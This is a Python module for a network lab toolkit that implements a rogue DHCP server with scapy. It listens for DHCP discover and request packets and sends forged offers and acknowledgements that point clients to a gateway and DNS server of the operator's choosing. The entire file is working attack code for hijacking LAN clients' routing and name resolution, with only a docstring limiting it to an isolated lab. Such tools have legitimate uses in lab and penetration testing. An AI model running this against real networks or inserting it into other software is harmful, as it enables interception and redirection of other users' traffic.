"""Rogue DHCP server for an isolated lab.

Works on Windows when the process is Administrator and Npcap is installed.
The real DHCP server on the LAN will race these offers. Use only on a lab segment.
"""

from __future__ import annotations

import time
from typing import Any

from scapy.all import BOOTP, DHCP, Ether, IP, UDP, conf, get_if_hwaddr, sendp, sniff  # type: ignore

from netlab.base import BaseModule, ModuleParam


def _mac_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))


class RogueDhcp(BaseModule):
    name = "rogue_dhcp"
    description = "Answer DHCP DISCOVER/REQUEST with our own offers (lab only)"
    category = "l2"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(name="interface", type="interface", label="Interface", required=False,
                default=None),
            ModuleParam(
                name="pool_start",
                type="ip",
                label="Pool start",
                required=True,
                description="First address to hand out",
            ),
            ModuleParam(name="gateway", type="ip", label="Gateway we advertise", required=True),
            ModuleParam(
                name="dns",
                type="ip",
                label="DNS we advertise",
                required=True,
            ),
            ModuleParam(
                name="subnet",
                type="str",
                label="Subnet mask",
                required=False,
                default="255.255.255.0",
            ),
            ModuleParam(
                name="server_ip",
                type="ip",
                label="Our DHCP server IP",
                required=True,
                description="IP configured on this host, on the lab interface",
            ),
            ModuleParam(
                name="lease",
                type="int",
                label="Lease (seconds)",
                required=False,
                default=600,
            ),
            ModuleParam(
                name="count",
                type="int",
                label="Pool size",
                required=False,
                default=20,
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=60,
                description="0 = until Stop",
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        iface = params["interface"]
        server_ip = params["server_ip"]
        gateway = params["gateway"]
        dns = params["dns"]
        mask = str(params.get("subnet") or "255.255.255.0")
        lease = int(params.get("lease", 600))
        duration = int(params.get("duration", 60))
        pool_size = max(1, min(int(params.get("count", 20)), 64))

        start_ip = params["pool_start"].split(".")
        if len(start_ip) != 4:
            raise ValueError("pool_start must be an IPv4 address")
        base = list(map(int, start_ip))
        pool = []
        for i in range(pool_size):
            octet = base[3] + i
            if octet > 254:
                break
            pool.append(".".join(str(x) for x in base[:3] + [octet]))
        if not pool:
            raise ValueError("DHCP pool is empty")

        assigned: dict[str, str] = {}
        conf.iface = iface
        conf.verb = 0
        start = time.time()
        our_mac = get_if_hwaddr(iface)
        print(f"[rogue_dhcp] listening on {iface} ({our_mac}), pool {pool[0]}..{pool[-1]}")
        print(f"  advertising gateway={gateway} dns={dns}")

        def next_ip(chaddr: str) -> str:
            if chaddr in assigned:
                return assigned[chaddr]
            free = [ip for ip in pool if ip not in assigned.values()]
            ip = free[0] if free else pool[len(assigned) % len(pool)]
            assigned[chaddr] = ip
            return ip

        def handle(pkt) -> None:
            if self.should_stop():
                return
            if not pkt.haslayer(DHCP) or not pkt.haslayer(BOOTP):
                return
            msg_type = None
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == "message-type":
                    msg_type = opt[1]
                    break
            if msg_type not in (1, 3):  # discover, request
                return
            client_mac = pkt[Ether].src
            offered = next_ip(client_mac)
            xid = pkt[BOOTP].xid
            reply_type = 2 if msg_type == 1 else 5  # offer / ack
            ether = Ether(src=our_mac, dst=client_mac)
            ip = IP(src=server_ip, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(
                op=2,
                yiaddr=offered,
                siaddr=server_ip,
                xid=xid,
                chaddr=_mac_bytes(client_mac).ljust(16, b"\x00"),
                flags=pkt[BOOTP].flags,
            )
            dhcp = DHCP(
                options=[
                    ("message-type", reply_type),
                    ("server_id", server_ip),
                    ("lease_time", lease),
                    ("subnet_mask", mask),
                    ("router", gateway),
                    ("name_server", dns),
                    "end",
                ]
            )
            rate_limiter.wait()
            crafted = ether / ip / udp / bootp / dhcp
            sendp(crafted, iface=iface, verbose=0)
            logger.add_packets(1, len(bytes(crafted)))
            kind = "OFFER" if reply_type == 2 else "ACK"
            print(f"  {kind} {offered} -> {client_mac}")

        try:
            sniff(
                iface=iface,
                filter="udp and port 67",
                prn=handle,
                store=0,
                timeout=duration if duration > 0 else None,
                stop_filter=lambda _: self.should_stop()
                or (duration > 0 and (time.time() - start) >= duration),
            )
        except KeyboardInterrupt:
            print("\n[rogue_dhcp] Interrupted")
        print("[rogue_dhcp] Done")
